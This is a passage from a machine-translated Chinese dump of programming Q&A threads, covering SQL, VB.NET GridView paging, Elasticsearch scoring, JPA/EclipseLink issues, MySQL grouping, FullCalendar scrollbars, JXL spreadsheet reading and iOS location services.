> 无法绑定多部分标识符“ids.id”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:25:57.633

不知道该函数的作用或您期望的结果，也许可以尝试：

```
select * -- name your columns!
from dbo.my_ids AS ids -- use schema prefix!
cross apply dbo.fn_getMatches(ids.id); -- use schema prefix! 
```

从您最初的尝试中删除了`WHERE`条款和标准。`ON`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:27:00.320

```
SELECT  *
        FROM my_ids ids
        CROSS APPLY fn_getMatches(ids.id) 
```

我不太*明白*你的 WHERE 子句，因为这似乎意味着你`ids.id`事先知道 的价值，而且它总是`NULL`.

# .net - 如何在gridview中查找记录/行的总数？

> ID：12429228
> 
> 赞同：0
> 
> 时间：2012-09-14T17:24:27.573
> 
> 标签：.net, vb.net, gridview, gridviewrow

我想在 gridview 中找到总行数。这是我的代码，页面大小= 10

```
 Private Sub GridView_RowDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewRowEventArgs) Handles CustomGridView1.RowDataBound
    Dim Count As Integer = CustomGridView1.Rows.Count()
    If e.Row.RowType = DataControlRowType.Footer Then
        e.Row.Cells(5).Text = Count & " of " & getstudents.Count()
    End If
End Sub 
```

页脚在第一页显示为 10 0f 50 但我想显示为 1-10 of 50 。在第二页中它显示相同，但​​我想显示为 11-20 of 50。谁能告诉我如何显示这样的页脚文本。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T17:27:01.520

是的，您必须声明一个变量来分配该函数的值。

```
Dim int as integer

int = CustomGridView1.Rows.Count() 
```

.Count() 函数返回一个整数值。您必须将该整数值存储在某处，否则调用该函数毫无意义。

编辑 - - -

也许是这样的

```
Private Sub GridView1_RowDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewRowEventArgs) Handles GridView1.RowDataBound
        If e.Row.RowType = DataControlRowType.Footer Then
            e.Row.Cells(2).Text = (variable you defined above)
        End If
    End Sub 
```

这只是我最好的猜测。我通常不使用页脚。

# python - 搜索 - 根据关键字与最左侧的接近程度来计算相关性？

> ID：12429232
> 
> 赞同：0
> 
> 时间：2012-09-14T17:24:38.467
> 
> 标签：python, django, lucene, elasticsearch, django-haystack

我目前正在使用**ElasticSearch**、**Python/Django**和**Django-Haystack**。

我希望根据关键字与最左侧的接近程度来对项目进行排名。

* * *

例子

项目是

*   `Jeff is friends with John, Laura and Edward`

*   `Laura is friends with Francis, Drake, Jessica and Jeff`

*   `Edward is friends with Laura, Jeff and Jeff`

* * *

如果 Jeff 是查询，我希望得到以下结果

1.  `Jeff is friends with John, Laura and Edward`

2.  `Edward is friends with Laura, Jeff and Jeff`

3.  `Laura is friends with Francis, Drake, Jessica and Jeff`

* * *

但我明白了：

1.  `Edward is friends with Laura, Jeff and Jeff`

2.  `Jeff is friends with John, Laura and Edward`

3.  `Laura is friends with Francis, Drake, Jessica and Jeff`

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T19:33:35.593

当你查询 elasticsearch 时，你会得到`_score`每个文档的字段，如果你将`explain=on`参数添加到 url，你也会得到关于分数的解释，通过它你可以理解为什么文档在顶部或不在顶部。

无论如何，我猜你的第一个文档得分最高，因为它包含 Jeff 这个词两次。第三个文档是最后一个，因为文本字段比其他文档长，并且它只包含一个 Jeff 匹配项。这就是计算 Lucene 分数的方式。您可以对其进行调整，例如禁用字段长度影响分数的事实，但除非您愿意编写一些 Lucene 代码，否则您无法完全更改其背后的逻辑。您可以编写自己的 Lucene`Similarity`实现并使用自定义的`SimilarityProvider`. 看看[这个](https://github.com/tlrx/elasticsearch-custom-similarity-provider)例子。

# java - 为什么 EntityManager createNativeQuery 列表有时返回 BigDecimal 而有时返回 Integer？

> ID：12429233
> 
> 赞同：2
> 
> 时间：2012-09-14T17:25:01.553
> 
> 标签：java, database, jpa, eclipselink, guava

*这让我很*困惑。我只是弄清楚发生了什么，但我会问并回答我自己的文档问题，以防它帮助其他人。

我有以下代码：

## MyClass.java

```
 public List<Integer> 
    getPersonIdsByPrograms(Collection<Integer> programIds, boolean getFirst) {
      String sql = "SELECT p.PERSON_ID FROM PERSON p " + 
                   "WHERE p.PROGRAM_ID in (?programIds)";
      sql = sql.replaceAll("\\?programIds", StringUtils.join(programIds, ","));
      Query query = entityManager.createNativeQuery(sql);

      //EntityManager returns scalar values, in this case, BigDecimal
      List<BigDecimal> queryResults = query.getResultList();

      // !! This is the toggle that makes or breaks the tests !!
      // !! !! UPDATE: Red herring. This had no impact.  See answer for why !! !!
      if (getFirst) {
        Object firstObj = queryResults.get(0); //This makes the test pass!?!
        //This is always true
        System.out.println("Is firstObj a BigDecimal? Answer: " 
               + (firstObj instanceof BigDecimal));
      }

      //Returns list of BigDecimal, so need to convert to Integer
      List<Integer> result = Lists.transform(queryResults, new Function<BigDecimal, Integer>() {
        public Integer apply(BigDecimal n) {
            return Integer.valueOf(n.intValue());
        }
    });
    return result;
} 
```

**警告** 现在这里是答案的来源，并且使下面的测试无效，因此请谨慎对待。我*认为*第一个断言会通过，而第二个断言会失败。情况并非如此：第一次在某些情况下最终失败了。

## MyClassTest.java

```
@Test
public void getPersonIdsByProgramsTest_BigDecimalOrInteger() {
    ArrayList<Integer> programs = Lists.newArrayList(131,141,161,162,0,113,110,26,5,28,50,58,51,29,121,31,101,41,27);
    List<?> personsByPrograms = userDao.getPersonIdsByPrograms(programs, true);
    TestingUtils.assertNotNullOrEmpty(personsByPrograms);
    Object shouldBeInteger = personsByPrograms.get(0);
    assertTrue(shouldBeInteger instanceof Integer);

    personsByPrograms = userDao.getPersonIdsByPrograms(programs, false);
    TestingUtils.assertNotNullOrEmpty(personsByPrograms);
    shouldBeInteger = personsByPrograms.get(0);
    assertTrue(shouldBeInteger instanceof Integer);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:25:01.553

# 答：不同的数据库可能返回不同的标量类型。

我的问题是使用`@RunWith(Parameterized.class)`针对 2 个不同数据库（Oracle 和 MS SQL Server）运行的单元测试的结果。它可能与列的定义方式有关（我没有研究过），但基本要点是您可能无法依赖 JPA 在数据库之间切换时将转换为的特定对象类型。为了安全起见，您可能只想假设`List<? extends Number>`.

# windows-phone-7 - 发布商 GUID 和广告控制

> ID：12429235
> 
> 赞同：0
> 
> 时间：2012-09-14T17:25:10.840
> 
> 标签：windows-phone-7, guid

如何将我的发布者 GUID 关联到我的 WP7 应用程序中的广告控件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:43:54.627

基本上，您将应用程序 ID (GUID) 与 AdControl 相关联，而不是与发布者 ID（同样是 GUID）相关联。在内部，Publisher Id 和 Application Id 应该在 MarketPlace（商店）相关联。您可以在此处找到更多详细信息： [http](http://advertising.microsoft.com/mobile-apps) ://advertising.microsoft.com/mobile-apps和 [http://msdn.microsoft.com/en-us/magazine/hh288088.aspx](http://msdn.microsoft.com/en-us/magazine/hh288088.aspx)

希望能帮助到你。

# jakarta-ee - EclipseLink 返回具有空主键的实体

> ID：12429237
> 
> 赞同：4
> 
> 时间：2012-09-14T17:25:13.987
> 
> 标签：jakarta-ee, jpa, jpa-2.0, eclipselink, java-ee-6

# 介绍

我有一个我觉得很神秘的问题。我在 Google 和 StackOverflow 上搜索过，没有发现任何人有类似的问题。我尝试将持久性提供程序切换到 Hibernate，但我们的代码过于依赖 EclipseLink 特性，无法使其成为调试的实用选项。如果这个问题仍然存在（哈，哈；Java EE 双关语），我很可能会为 Hibernate 重新编写所有持久性代码，因为它有帮助。

# 精简版：

1.  我的一个实体，`ExperimentBlock`，被正确地持久化到数据库中，并且它的自动增量主键被正确地生成。但是，当*从*数据库中读取它时，EclipseLink 会为我*提供具有空主键字段*的实体。这在生产软件中造成了毁灭性的错误。
2.  `ExperimentBlock`从其超类继承其主键字段和注释、getter 和 setter `PeriodResident`。其他几个子类也`PeriodResident`这样做，*但 EclipseLink 正确加载了它们的 primary key*。这是这个错误的奥秘：完全相同的字段/getter/setter 代码用于 的每个子类`PeriodResident`，但`ExperimentBlock`它是 EclipseLink 返回的唯一一个主键为空的！
3.  运行选择`ExpermentBlock`s 的 JPQL 查询会返回它们的主键为空。（悲伤的脸。）但是，运行专门选择主键字段的 JPQL 查询`ExperimentBlock`可以正常工作，并返回整数主键列表！这可以在下面的查询`ExperimentBlock.findWithIdsBySchedule`中看到。

# 细节

GlassFish 3.1.2、EclipseLink 2.4.0、Java EE 6、MySQL 5.0.95-log

我没有任何例外。此问题发生在远程和本地会话 bean 中。

代码如下，如果我应该提供更多详细信息，请告诉我。

## PeriodResident.java

（问题的超类`ExperimentBlock`。这是定义主键字段——uniqueID——的地方）

```
package ohno;

import ohno.ShiftDateConverter;
import ohno.Shift;
import ohno.Facility;
import java.io.Serializable;
import java.util.Date;
import javax.persistence.Basic;
import javax.persistence.Column;
import javax.persistence.DiscriminatorColumn;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Inheritance;
import javax.persistence.InheritanceType;
import javax.persistence.JoinColumn;
import javax.persistence.ManyToOne;
import javax.persistence.Table;
import org.eclipse.persistence.annotations.Convert;
import org.eclipse.persistence.annotations.Converter;

@Converter(converterClass=ShiftDateConverter.class, name="ShiftDateConverter")
@Entity
@Inheritance(strategy = InheritanceType.JOINED)
@Table(name="bs_blocks")
@DiscriminatorColumn(name="block_type")
public abstract class PeriodResident implements Serializable {
    private static final long serialVersionUID = 1L;

    public PeriodResident() {
    }

    /**
     * Sets the database unique id.
     *
     * @param uniqueID the new database unique id
     */
    public void setUniqueID(Integer uniqueID) {
        this.uniqueID = uniqueID;
    }

    /**
     * Provides a useful super-constructor handling initialization of the first
     * and last Shifts of the PeriodResident's time block, and the Facility
     * where it takes place.
     *
     * @param startShift The first Shift in the PeriodResident's time block.
     * @param endShift The last Shift in the PeriodResident's time block.
     * @param facility The Facility where the PeriodResident takes place.
     * @param uniqueID the unique id
     */
    public PeriodResident(Shift startShift, Shift endShift, Facility facility,
            int uniqueID) {
        this.startShift = startShift;
        this.endShift = endShift;
        this.facility = facility;
        this.uniqueID = uniqueID;
    }

    /**
     * Instantiates a new period resident.
     *
     * @param startShift The first Shift in the PeriodResident's time block.
     * @param endShift The last Shift in the PeriodResident's time block.
     * @param facility The Facility where the PeriodResident takes place.
     */
    public PeriodResident(Shift startShift, Shift endShift, Facility facility) {
        this(startShift, endShift, facility, null);
    }

    /**
     * Gets the facility.
     *
     * @return the Facility where the PeriodResident takes place.
     *
     * @see #setFacility(Facility)
     */

    public Facility getFacility() {
        return facility;
    }

    /**
     * Gets the shifts.
     *
     * @return the total number of Shifts in the PeriodResident's time block.
     *
     * @see #getStartShift()
     * @see #getEndShift()
     */

    public int getShifts() {
        return endShift.getShiftsDifference(startShift);
    }

    /**
     * Gets the start shift.
     *
     * @return the first <code>Shift</code> in the PeriodResident's time
     * block.
     *
     * @see #setStartShift(Shift)
     * @see #getShifts()
     */
    public Shift getStartShift(){
        return startShift;
    }

    /**
     * Gets the end shift.
     *
     * @return the last <code>Shift</code> in the PeriodResident's time block.
     *
     * @see #setEndShift(Shift)
     * @see #getShifts()
     */
    public Shift getEndShift(){
        return endShift;
    }

    /**
     * Gets the database table unique ID for this particular PeriodResident, or null if
     * it hasn't one.
     *
     * @return this PeriodResident's unique ID in the database.
     */

    public Integer getUniqueID() {
        return uniqueID;
    }

    /**
     * sets this PeriodResident's facility location with the given Facility.
     *
     * @param facility the PeriodResident's new Facility.
     *
     * @see #getFacility()
     */
    public void setFacility(Facility facility) {
        this.facility = facility;
    }

    /**
     * sets this PeriodResident's time block's new starting shift with the given
     * Shift.
     *
     * @param startShift the new starting shift.
     *
     * @see #getStartShift()
     */
    public void setStartShift(Shift startShift) {
        this.startShift = startShift;
    }

    /**
     * sets this PeriodResident's time block's new ending shift with the given
     * Shift.
     *
     * @param endShift the new ending shift.
     *
     * @see #getEndShift()
     */
    public void setEndShift(Shift endShift) {
        this.endShift = endShift;
    }

    public Schedule getSchedule() {
        return schedule;
    }

    public void setSchedule(Schedule schedule) {
        this.schedule = schedule;
    }

    protected void copyCharacteristics(PeriodResident original, PeriodResident clone) {
        clone.setStartShift(original.getStartShift().clone());
        clone.setEndShift(original.getEndShift().clone());
        clone.setFacility(original.getFacility());
        clone.setSchedule(original.getSchedule());
    }

    /* (non-Javadoc)
     * @see java.lang.Object#toString()
     */
    @Override
    public String toString() {
        return "PeriodResident  (Facility: " + facility + ") from " + startShift + " to " + endShift;
    }

    @Override
    public abstract Object clone();

    public abstract String getResidentType();

    @Override
    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }

        final PeriodResident other = (PeriodResident) obj;
        if ((uniqueID == null && other.uniqueID != null) || (this.uniqueID != null && !this.uniqueID.equals(other.uniqueID))) {
            return false;
        }
        return true;
    }

    @Override
    public int hashCode() {
        if (uniqueID != null) {
            return uniqueID;
        }
        int hash = 7;
        hash = 73 * hash + (this.uniqueID != null ? this.uniqueID.hashCode() : 0);
        hash = 73 * hash + (this.startShift != null ? this.startShift.hashCode() : 0);
        hash = 73 * hash + (this.endShift != null ? this.endShift.hashCode() : 0);
        hash = 73 * hash + (this.facility != null ? this.facility.hashCode() : 0);
        hash = 73 * hash + (this.schedule != null ? this.schedule.hashCode() : 0);
        hash = 73 * hash + getClass().hashCode();
        return hash;
    }

    /* (non-Javadoc)
     * @see java.lang.Object#equals(java.lang.Object)
     */
    public boolean equivalent(PeriodResident other) {
        if (this == other) {
            return true;
        }
        if (other == null) {
            return false;
        }
        if (getClass() != other.getClass()) {
            return false;
        }
        if (endShift == null) {
            if (other.endShift != null) {
                return false;
            }
        } else if (!endShift.equals(other.endShift)) {
            return false;
        }
        if (facility == null) {
            if (other.facility != null) {
                return false;
            }
        } else if (!facility.equals(other.facility)) {
            return false;
        }
        if (startShift == null) {
            if (other.startShift != null) {
                return false;
            }
        } else if (!startShift.equals(other.startShift)) {
            return false;
        }
        if (schedule == null) {
            if (other.getSchedule() != null) {
                return false;
            }
        } else if (!schedule.equals(other.getSchedule())) {
            return false;
        }
        return true;
    }

    public Date getStartShiftDate() {
        return getStartShift().getTime();
    }

    public Date getEndShiftDate() {
        return getEndShift().getTime();
    }

    /** The database unique id. */
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Basic(optional = false)
    @Column(name = "id")
    Integer uniqueID;

    /** The start shift of the PeriodResident. */
    @Column(name = "start_time")
    @Convert(value="ShiftDateConverter")
    Shift startShift;

    /** The end shift of the PeriodResident.*/
    @Column(name = "end_time")
    @Convert(value="ShiftDateConverter")
    Shift endShift;

    /** The facility where the PeriodResident lives. */
    @ManyToOne
    @JoinColumn(name = "facility", referencedColumnName = "ID")
    Facility facility;
    @ManyToOne
    @JoinColumn(name = "schedule", referencedColumnName = "ID")
    private Schedule schedule;
} 
```

## 实验块.java

（问题类...请注意最后一个 JPQL 查询，它选择 an`ExperimentBlock`及其`uniqueID`。运行此查询时，`ExperimentBlock.uniqueId`它为空，但`uniqueID`手动选择的那个是正确的。）

```
package ohno;

import ohno.Experiment;
import ohno.Role;
import java.io.Serializable;
import javax.persistence.DiscriminatorValue;
import javax.persistence.Embedded;
import javax.persistence.Entity;
import javax.persistence.JoinColumn;
import javax.persistence.ManyToOne;
import javax.persistence.NamedQueries;
import javax.persistence.NamedQuery;
import javax.persistence.Table;
import javax.persistence.Transient;

/**
 *
 * @author Nick
 */
@Entity
@Table(name = "bs_blocks_experiment")
@NamedQueries({
    @NamedQuery(name = "ExperimentBlock.findAll", query = "SELECT e FROM ExperimentBlock e"),
    @NamedQuery(name = "ExperimentBlock.findActualByExperiment", query = "SELECT e FROM ExperimentBlock e WHERE e.experiment = :experiment AND e.schedule.scheduleProperties.revision = :active ORDER BY e.schedule.id DESC, e.uniqueID DESC"),
    @NamedQuery(name = "ExperimentBlock.findByTime", query = "SELECT e FROM ExperimentBlock e WHERE e.startShift < :endTime AND e.endShift > :startTime and e.schedule = :schedule"),
    @NamedQuery(name = "ExperimentBlock.findWithIdsBySchedule", query = "SELECT e, e.uniqueID FROM ExperimentBlock e WHERE e.schedule = :schedule")})
@DiscriminatorValue(value = "EXPERIMENT_BLOCK")
public class ExperimentBlock extends PeriodResident implements Serializable {

    private static final long serialVersionUID = 1L;
//    #########
//    Some columns are inherited from PeriodResident!
//    #########
    @Embedded
    protected Equipment equipment;
    @ManyToOne
    @JoinColumn(name = "experiment", referencedColumnName = "exp_id")
    private Experiment experiment;

    public ExperimentBlock() {
    }

    public Equipment getEquipment() {
        return equipment;
    }

    public void setEquipment(Equipment equipment) {
        this.equipment = equipment;
    }

    public Experiment getExperiment() {
        return experiment;
    }

    public void setExperiment(Experiment experiment) {
        this.experiment = experiment;
    }

    @Override
    public boolean equivalent(PeriodResident pr) {
        if (!super.equivalent(pr)) {
            return false;
        }
        ExperimentBlock other = (ExperimentBlock) pr;
        if (!getExperiment().equals(other.getExperiment())) {
            return false;
        }
        if (!getEquipment().equals(other.getEquipment())) {
            return false;
        }
        return true;
    }

    @Override
    public ExperimentBlock clone() {
        ExperimentBlock clone = new ExperimentBlock();
        copyCharacteristics(this, clone);
        clone.setExperiment(getExperiment());
        clone.setEquipment(equipment.clone());
        return clone;
    }

    @Override
    public String getResidentType() {
        return RESIDENT_TYPE;
    }
    @Transient
    public static final String RESIDENT_TYPE = "ExperimentBlock";

    @Override
    public String toString() {
        return "Experiment " + experiment + "\nChannel: " + getFacility()
                + "\nEquipment: " + getEquipment() + "\nFrom "
                + getStartShift() + "\nto " + getEndShift();
    }

    /**
     * Gets an HTML string representation of this.
     *
     * @return the string
     */
    public String toFancyString() {
        return "<html>Experiment <b>" + (experiment.isNoExperiment() ? "N/A" : experiment) + "</b><br>Channel: " + getFacility()
                + "<br>Equipment: " + getEquipment() + "<br>From: <b>"
                + getStartShift().toString(Role.BEGINNING) + "</b><br>To: <b>" + getEndShift().toString(Role.ENDING)
                + "</b><br>Shift Count: <b>" + getShifts() + "</b></html>";
    }
} 
```

# *＆C。*

所以我`ExperimentBlock.getWithIdsBySchedule`在会话 bean 中运行查询。我调试，在运行该查询后立即设置断点，并检查结果。在查询结果中，我得到一个 [ `ExperimentBlock`, `Integer`] 列表—— `ExperimentBlock`s`uniqueID`都是空的；但是，整数（手动查询`uniqueID`的 s 的`ExperimentBlock`s）都已正确填充。

# 结论

有任何想法吗？这真的可以帮助我摆脱困境。再次，让我知道我是否可以提供更多信息。

# 附加物

*   对这个问题的 Hackish（即“cludge”）解决方案绝对是受欢迎的，以及优雅的解决方案。
*   我检查了数据库（表定义、外键等），找不到任何`ExperimentBlock`可以解释我的问题的特别之处。
*   （来自下面的评论：） 的所有其他持久属性`ExperimentBlock`都正确加载。加载`ExperimentBlock`with`em.find()`会导致同样的问题。（上面，我从 JPQL 查询中加载它并作为不同类的属性`Schedule`。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:43:38.653

奇怪的。这个对象必须与工作的兄弟姐妹有所不同。

你可以尝试一些事情来缩小问题的范围，

*   对 id 列（以及所有其他列/表）使用大写的“ID”
*   尝试禁用编织，或“eclipselink.weaving.internal”
*   尝试删除您的 clone/equals/hashCode 方法

还要启用日志记录，并包括为查询生成的 SQL 和完整的异常堆栈跟踪。

# mysql - MySQL SELECT、JOIN、GROUP BY 查询优化

> ID：12429238
> 
> 赞同：1
> 
> 时间：2012-09-14T17:25:24.580
> 
> 标签：mysql

我正在尝试从具有类别 ID（1、5、12）的类别中选择 DISTINCT 产品，由 MySQL 数据库中的 cat_order + prod_order 排序

**问题：**

如果在多个类别中找到产品，我需要显示第一个结果，

即：产品编号 1 分配给类别 1 和 5，我需要显示类别 1 中的产品编号 1 及其 prod_order 并跳过类别 5 中的列表，

*   基本上我需要显示类别 1 中的所有产品，而不是移动到类别 5 并显示那里的所有产品，其中产品 id 以前未显示，然后移动到列表中的另一个类别 (12)

如果我运行类似：

```
SELECT
    prod_to_cat.prod_id AS prod_to_cat_prod_id,
    prod_to_cat.prod_order AS prod_to_cat_prod_order,
    prod_to_cat.cat_id AS prod_to_cat_cat_id,
    prod_to_cat.cat_order AS prod_to_cat_cat_order,
    products.id,
    products.name

FROM
    prod_to_cat, products

WHERE
    prod_to_cat.prod_id = products.id
AND prod_to_cat.cat_id IN (1, 5, 12)
GROUP BY 
    prod_to_cat.prod_id
ORDER BY
    prod_to_cat_cat_order ASC,
    prod_to_cat_prod_order DESC 
```

我得到不一致的结果（产品 1 不会从列表中的第一个类别中选择），这就是为什么我选择不选择“GROUP BY prod_id”并用另一个选择包装，而不是按 prod_id 分组。

像这样：

```
SELECT
    prod_to_cat_prod_id,
    prod_to_cat_prod_order,
    prod_to_cat_cat_id,
    name
FROM
    (
        SELECT
            prod_to_cat.prod_id AS prod_to_cat_prod_id,
            prod_to_cat.prod_order AS prod_to_cat_prod_order,
            prod_to_cat.cat_id AS prod_to_cat_cat_id,
            prod_to_cat.cat_order AS prod_to_cat_cat_order,
            products.id,
            products.name
        FROM
            prod_to_cat, products
        WHERE
            prod_to_cat.prod_id = products.id
        AND prod_to_cat.cat_id IN (1, 5, 12)
        ORDER BY 
            prod_to_cat_cat_order ASC,
            prod_to_cat_prod_order DESC
    ) AS prod
GROUP BY
    prod_to_cat_prod_id
ORDER BY
    prod_to_cat_cat_order ASC,
    prod_to_cat_prod_order DESC
LIMIT 0, 10; 
```

**我正在尝试做的事情：**

我正在尝试找到一种更有效的方法来做到这一点。

表结构：

```
prod_to_cat:

prod_id | cat_id | cat_order | prod_order   |
    1        1          1           2
    2        1          1           0
    3        1          1           0
    1        5          2           4
    4        5          2           0

products:

id  |   name |  descr   |   price   |
 1    name_1
 2    name_2
 3    name_3
 4    name_4 
```

每个产品可以属于任意数量的类别，例如产品 id 1 属于上例中的类别 id 1 和 5。

非常感谢任何回复。帕夏

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:33:55.977

您想要[分组最小值](http://dev.mysql.com/doc/en/example-maximum-column-group-row.html)：

```
SELECT   prod_to_cat.*,
         products.name
FROM     prod_to_cat NATURAL JOIN (
           SELECT   prod_id,
                    MIN(cat_id) AS cat_id
           FROM     prod_to_cat
           WHERE    cat_id IN (1, 5, 12)
           GROUP BY prod_id
         ) t
    JOIN products ON t.prod_id = products.id
ORDER BY prod_to_cat.cat_order  ASC,
         prod_to_cat.prod_order DESC 
```

在[sqlfiddle](http://sqlfiddle.com/#!2/a3696/2/0)上查看。

# jquery - Jquery完整日历删除滚动条

> ID：12429245
> 
> 赞同：20
> 
> 时间：2012-09-14T17:25:54.703
> 
> 标签：jquery, fullcalendar

我正在使用 jquery 完整日历，但我试图摆脱滚动条。我试过设置高度，不起作用。

任何人都有修复（他们已经使用过！，没有链接 - 我已经尝试了大部分）？

我在用着：

```
$('#calendar').fullCalendar({
        firstDay: 1,
        minTime:@Model.MinHour,
       maxTime:@Model.MaxHour}) 
```

![截屏](../Images/4c2dfd781a8e8e55f7507aa53f516cf0.png)

页面足够大，只是不能让该死的东西去！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2018-08-24T05:12:05.997

试试这个[https://fullcalendar.io/docs/contentHeight](https://fullcalendar.io/docs/contentHeight) contentHeight:"auto"，用于删除滚动条

```
<script>

        jQuery('#calendar').fullCalendar({
         header: {
            left: 'prev',
            center: 'title',
            right: 'next'
        },
        defaultView: 'month',
        showNonCurrentDates:false,
        fixedWeekCount:false,
        contentHeight:"auto",
        handleWindowResize:true,
        themeSystem:'bootstrap3',

    });
</script> 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2015-09-21T11:48:13.677

我将 height 和 contentHeight 设置为相同的值，它似乎已经成功了。

CSS：

```
#calendar {
   height:1000px;
} 
```

js：

```
var calHeight = 1000;

$('#calendar').fullCalendar({
    height:calHeight,
    contentHeight:calHeight
}); 
```

**编辑：**

我在视图之间刷新时发现，当我不希望它显示滚动时，它会显示滚动。添加了这个：

```
.fc-scroller {
   overflow-y: hidden !important;
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-10-16T08:54:45.803

从 2.1.0 版本开始，高度选项可以设置为“自动”

[https://fullcalendar.io/docs/display/height/](https://fullcalendar.io/docs/display/height/)

这将删除垂直滚动条

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-12-31T11:45:57.330

尽管它的文档说`auto`为[height](https://fullcalendar.io/docs/height)和[contentHeight](https://fullcalendar.io/docs/contentHeight)提供的选项有效，但仅适用于以上版本`2.1.0`。

此代码适用于任何版本：

```
.fc-scroller {
  height: auto !important;
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-14T17:33:58.523

克里特岛包含您的日历的 div，然后放入 css`overflow-y:hidden;overflow-y:hidden;`

```
div class="container-calendar"

.container-calendar {

overflow-x:hidden;
overflow-y:hidden;

} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-08-30T17:30:40.093

你可以`height: 'auto'`用来移除卷轴

```
$('#calendar').fullCalendar({
    height:'auto',
    ...
 }); 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-10-26T14:58:52.730

在 fullcalendar 版本 2.7.1 中，这可以通过调用设置溢出的函数来修复注释行：

```
this.applyOverflow(); 
```

有 2 个函数调用此函数：clear（大约 8855 行）和 render（大约 8843 行）

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-11-10T17:51:51.057

```
$('.fullCalendar').fullCalendar({
                aspectRatio: 1.605,  -> this works for me 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-09-05T04:48:17.783

您可以尝试扩大日历的宽度以使滚动条超出视口的右侧，然后为包含元素设置溢出-x：隐藏。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-06-24T12:18:02.237

尝试这个：

```
$(document).ready(function () {
    $('#calendar').fullCalendar({
        height: 300,
        contentHeight: 360,
    });
}); 
```

这些 300 和 360 是一个示例，您可以将它们设置为您想要的任何内容，而想法保持不变..

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-09-21T15:00:08.570

我最终使用了解决该错误的更高版本

* * *

## 回答 #12

> 赞同：-2
> 
> 时间：2012-09-14T17:35:09.583

你可以尝试两件事：

CSS：将日历包装在 div 中

```
div id{
overflow:hidden
} 
```

JS：

```
$('#calendar').height($(window).height()); 
```

应该解决你的问题。

# java - 使用 JXL 读取 Excel，每行的单元格计数在行之间变化

> ID：12429247
> 
> 赞同：7
> 
> 时间：2012-09-14T17:26:00.410
> 
> 标签：java, excel, jxl

我已经尝试找到解决方案，但没有找到与我的问题相匹配的解决方案。我正在使用 JXL 读取 excel 电子表格并将每一行转换为指定的对象。一行中的每个单元格对应于我正在创建的对象的一个​​属性。我的电子表格有 41 列，读取 375 行后，每行的单元格数从 41 变为 32。我不知道为什么。

这是我遍历行并检索单元格的代码：

```
 w = Workbook.getWorkbook(inputWorkbook);
  // Get the first sheet
  Sheet sheet = w.getSheet(0);
  // Loop over first 10 column and lines

  for (int row=1; row < sheet.getRows();row++)
  {
      EventData event = new EventData();
      // we skip first row bc that should be header info
      //now iterate through columns in row
      try
      {
          Cell[] cell = sheet.getRow(row);

          event.Name = cell[0].getContents();
          event.Location = cell[1].getContents(); 
```

其余代码继续获取每个单元格的内容并相应地分配它们。但是当尝试访问第 376 行上的单元格 [32] 时，我得到了一个越​​界异常。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-29T14:58:24.220

难道不仅仅是该行上单元格[32]之后的所有内容都是空的，因此根本没有创建数组中的单元格[32]（及以上）吗？我现在刚从 jxl 开始，我认为这就是我所看到的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-04-01T06:19:35.060

而不是访问单元格数据：

```
Cell[] cell = sheet.getRow(row);
event.Name = cell[0].getContents();
event.Location = cell[1].getContents(); 
```

尝试以如下方式访问数据：

```
sheet.getCell(column, row); 
```

完整的代码是：

```
w = Workbook.getWorkbook(inputWorkbook);
// Get the first sheet
Sheet sheet = w.getSheet(0);
// Loop over first 10 column and lines

for (int row=1; row < sheet.getRows();row++)
{
    EventData event = new EventData();
    // we skip first row bc that should be header info
    //now iterate through columns in row
    try
    {
        event.Name = sheet.getCell(0, row).getContents();
        event.Location = sheet.getCell(1, row).getContents();
    }
} 
```

# ios - locationManager:didFailWithError: 如果用户位置服务关闭，则不调用

> ID：12429249
> 
> 赞同：3
> 
> 时间：2012-09-14T17:26:10.520
> 
> 标签：ios, cllocationmanager

来自[locationManager:didFailWithError 的文档：](http://developer.apple.com/library/ios/#documentation/CoreLocation/Reference/CLLocationManagerDelegate_Protocol/CLLocationManagerDelegate/CLLocationManagerDelegate.html#//apple_ref/doc/uid/TP40007124-CH3-SW4)

> 如果用户拒绝您的应用程序使用定位服务，此方法将报告 kCLErrorDenied 错误。收到此类错误后，您应该停止定位服务。

当用户对“MyApp 想要使用您当前的位置”问题按“不允许”时，它会起作用，因此您可以管理这种可能性。

但是，当用户对“打开定位服务以允许“MyApp”确定您的位置”问题按下“取消”时，什么也没有发生（如果定位服务关闭，则会出现该消息。

有没有办法进行任何类型的回调？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T18:21:58.070

用于`[CLLocationManager locationServicesEnabled]`该特定情况。

# c# - 如何将整数与从枚举中获得的值进行比较？

> ID：12429252
> 
> 赞同：1
> 
> 时间：2012-09-14T17:26:21.740
> 
> 标签：c#

我有以下方法和枚举：

```
public int GetRowType(string pk) 
    {
        return Convert.ToInt32(pk.Substring(2, 2));
    }

public enum CONTENT {
    Menu = 0,
    Article = 1,
